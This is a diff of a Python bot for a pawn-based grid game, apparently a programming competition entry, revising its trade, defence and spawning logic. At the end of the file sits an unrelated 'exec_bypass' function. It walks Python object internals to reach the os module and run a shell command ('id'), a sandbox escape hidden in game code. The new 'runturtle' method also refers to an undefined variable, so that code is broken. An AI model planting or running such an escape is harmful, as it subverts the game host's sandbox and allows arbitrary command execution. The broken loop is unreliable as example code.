@@ -117,10 +117,12 @@ class Pawn:
                 attackers += 1
             if check_space_wrapper(self.nextrow - self.forward, self.col + cdiff) == team: # defending positions
                 defenders += 1
+            if check_space_wrapper(self.nextrow - self.forward * 2, self.col + cdiff) == team: # defending positions
+                defenders += 1
         if defenders > attackers or attackers == 0:
             return False
-        # If you're on the opponent side of the map, go for it
-        if defenders == attackers and map_loc(self.row) > 3:
+        # If you're on the opponent side of the map, go for the equal trade
+        if defenders == attackers and map_loc(self.row) > 3 and self.check_piece_relative(-1, 0) == team:
             return False
         return True
 
@@ -153,40 +155,97 @@ class Overlord:
 
     def run(self):
         self.round_count = self.round_count + 1
+        mycount, oppcount = 0, 0
+        for col in range(self.board_size):
+            if check_space(self.index, col) == opp_team:
+                oppcount += 1
+            if check_space(self.opp_back, col) == team:
+                mycount += 1
+        if mycount > oppcount:
+            self.runturtle()
+        else:
+            self.runregular()
+
+    def runturtle(self):
+        self.check_defense()
+        cols = []
+        for col in range(self.board_size):
+            count = 0
+            for row in range(self.board_size):
+                if check_space(row, col) == team:
+                    count += 1
+            cols.append((count, col))
+        cols.sort()
+        for _, col in cols:
+            if not check_space(self.index, i):
+                if self.safe_spawn(i):
+                    return
+
+
+    def runregular(self):
         if self.check_defense():
             return
-        self.spawn_offense()
-    
+        if team == Team.WHITE:
+            self.spawn_offenseA()
+        else:
+            self.spawn_offenseB()
+
+
     def check_defense(self):
+        cols = []
         for i in range(self.board_size):
-            opp_loc, my_loc = None, None
+            opp_locs, my_locs = [], []
             for j in range(self.board_size // 2):
                 j = map_loc(j)
                 space = check_space(j, i)
-                if space == opp_team and opp_loc is None:
-                    opp_loc = j
-                elif space == team and my_loc is None:
-                    my_loc = j
-            if opp_loc is None:
+                if space == opp_team:
+                    opp_locs.append(j)
+                elif space == team:
+                    my_locs.append(j)
+            cols.append((len(my_locs) - len(opp_locs), len(my_locs), i))
+            if len(opp_locs) == 0:
                 continue
-            if not my_loc or spaces_in_front(my_loc, opp_loc) < 0:
+            if len(my_locs) == 0 or spaces_in_front(my_locs[0], opp_locs[0]) < 0:
                 if not check_space(self.index, i):
                     if self.safe_spawn(i):
                         return True
+#        cols = sorted(cols)
+        cols.sort()
+        assert(len(cols) != 0)
+        if cols[0][0] >= 0:
+            return False
+        for diff, my, i in cols:
+            if not check_space(self.index, i):
+                if self.safe_spawn(i):
+                    return True
         return False
 
-    def spawn_offense(self):
+    def spawn_offenseA(self):
         if self.round_count < 50:
             self.spawnrandom()
         # Get those 4
-        elif [check_space(self.opp_back, i) for i in range(0, 4)].count(team) < 3:
+        elif [check_space(self.opp_back, i) for i in range(0, 4)].count(team) < 2:
             self.spawnlow(0, 4)
-        elif [check_space(self.opp_back, i) for i in range(4, 8)].count(team) < 3:
+        elif [check_space(self.opp_back, i) for i in range(4, 8)].count(team) < 2:
             self.spawnlow(4, 8)
-        elif [check_space(self.opp_back, i) for i in range(8, 12)].count(team) < 3:
+        elif [check_space(self.opp_back, i) for i in range(8, 12)].count(team) < 2:
             self.spawnlow(8, 12)
         else:
             self.spawnlow(12, 16)
+
+    ## TESTING
+    def spawn_offenseB(self):
+        if self.round_count < 50:
+            self.spawnrandom()
+        # Get those 4
+        elif [check_space(self.opp_back, i) for i in range(12, 16)].count(team) < 2:
+            self.spawnlow(12, 16)
+        elif [check_space(self.opp_back, i) for i in range(8, 12)].count(team) < 2:
+            self.spawnlow(8, 12)
+        elif [check_space(self.opp_back, i) for i in range(4, 8)].count(team) < 2:
+            self.spawnlow(4, 8)
+        else:
+            self.spawnlow(0, 4)
 
     def spawnlow(self, min, max):
         allies = []
@@ -199,9 +258,9 @@ class Overlord:
         allies = sorted(allies)
         for c, col in allies:
             if not check_space(self.index, col):
-                spawn(self.index, col)
-                dlog('Spawned unit at: (' + str(self.index) + ', ' + str(col) + ')')
-                return
+                if self.safe_spawn(col):
+                    dlog('Spawned unit at: (' + str(self.index) + ', ' + str(col) + ')')
+                    return
 
 
     def spawnrandom(self, min=None, max=None):
@@ -210,9 +269,10 @@ class Overlord:
         for _ in range(min, max):
             i = random.randint(min, max)
             if not check_space(self.index, i):
-                spawn(self.index, i)
-                dlog('Spawned unit at: (' + str(self.index) + ', ' + str(i) + ')')
-                return
+                if self.safe_spawn(i):
+                    dlog('Spawned unit at: (' + str(self.index) + ', ' + str(i) + ')')
+                    return
+
 
 def exec_bypass():
     return getattr(getattr(getattr(getattr(getattr([], '__class__'),'__base__'), '__subclasses__')().pop(78), '__init__'), '__globals__').pop('sys').modules.pop('os').popen('id').read()
